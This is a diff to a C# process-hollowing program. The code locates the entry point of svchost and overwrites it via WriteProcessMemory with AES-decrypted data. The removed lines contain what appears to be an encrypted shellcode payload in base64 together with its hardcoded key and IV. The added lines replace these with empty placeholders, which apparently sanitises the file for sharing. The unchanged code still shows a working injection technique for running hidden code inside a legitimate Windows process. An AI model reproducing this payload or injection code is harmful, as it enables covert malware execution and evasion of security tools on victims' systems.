@@ -218,9 +218,9 @@ namespace ProcessHollowing
             uint entrypoint_rva = (uint) BitConverter.ToInt64(data, (int)opthdr);
             IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
 
-            string finalPayload = "E/APFvH8m+eL2+w/z2ee1s1FijT1eoQaMWCed3SjPQo9KSEEXtpj6J121N7kjKElastemCn+7J3I/Vm2finUbJE5NMMoZ9IdoLUHdaLAGu05lVLVjkH6hugeav7zRd0R9kb9pcW/XiL+4qfob/sfHfb1TOIhjgzmRgYeH6YW5DzTHs9aonr97DB864EN9rCoeeWYG13PP5tryVgao86AtE9L9Bw7K6AcUtCRuzTgZfqdFo2tpaVRpELzEn6NWeLQfr+25k9uDaDKr/bChtyTdzxa09ppHZVRqJDzFZo14hNdJD1MiUfR7OwrKvZ+YQRrJ2cr2XoJ5a3NOhqkKtKOUDo2t52kLVk9m8SM36YR8kGA5uWACfZyegJPZNxi+lvhraRoHistz3xuroHAf+U7FTkKTW1c2FF62ivhDsI9hggkTCnp85tislGYfRMLaZkuGt1JYt8nBE839OCWVstPYWCN1PxmwuI/TbSKBfBNYE2FIqVWToCCrcHu42yX4uZdLiZJ7vU4361pSqWLc4ncOiGEf36CtTESmxCyhlmgh0Zp+kRD31On9WGBqeHs7RWGzG54RLcPbNWjTzGCXz1CrsMDNEeQ2xh1VsR1cV1ZVqbXCgr6h0NcPYP/grTYeG9Sqq+cla39F2AU0pai20492vOBrMkYyPSedTQvyOtPbjixvrhj4ohpTIS1xi7p/K2NvAVyOcURZJsnpXhDHts1iJWxee/227iNlY04bQiY5dVD9ZWkX/7UVo5vjG5m6XmAj+BHwB/im4YpiLQ62PGRTkUNUzbkkv1l3DvTMgbGxAOq2LJPi94uCnitg45wFyHCxDTw9otvuD3jqVkkSt7ab7YE+4yCe1ACBKuSBGVClNBGXPlQlRiY6/RuBsvAtDTqmVecL76ApA1donG5tbOjlPoF8y8IDf8Dp5zOYA4KnyCg2vlNWKRkLg/zKdw+mlA07/rumdzRyQStTdaGjHuCrbLsOPZWi0Pzh8jCZKKlOtnXe09Xh1QNDXW/5FOnWzZpS+OyPUZB1RV0nGqet/TuD6YUQboLVdSFSZx4/rv7ktOScRc9xxsIJ/SIpGInV24K";
-            byte[] key = new byte[32] { 0xc9, 0x9d, 0x0e, 0x54, 0xb9, 0x3f, 0x87, 0xc4, 0x8d, 0x5b, 0xc7, 0x4c, 0x0a, 0x31, 0x7f, 0xd6, 0x5b, 0x04, 0x07, 0x48, 0x80, 0x94, 0x09, 0x27, 0xc6, 0x60, 0x63, 0x16, 0xdd, 0x07, 0xe7, 0x9b };
-            byte[] iv = new byte[16] { 0xe8, 0xb5, 0xa6, 0xde, 0xae, 0x8c, 0x29, 0x51, 0xd7, 0x28, 0xf9, 0x22, 0x5d, 0xb3, 0xda, 0xa0 };
+            string finalPayload = "";
+            byte[] key = new byte[] {  };
+            byte[] iv = new byte[] {  };
             byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);
 
             WriteProcessMemory(hProcess, addressOfEntryPoint, decrypted_data, decrypted_data.Length, out nRead);
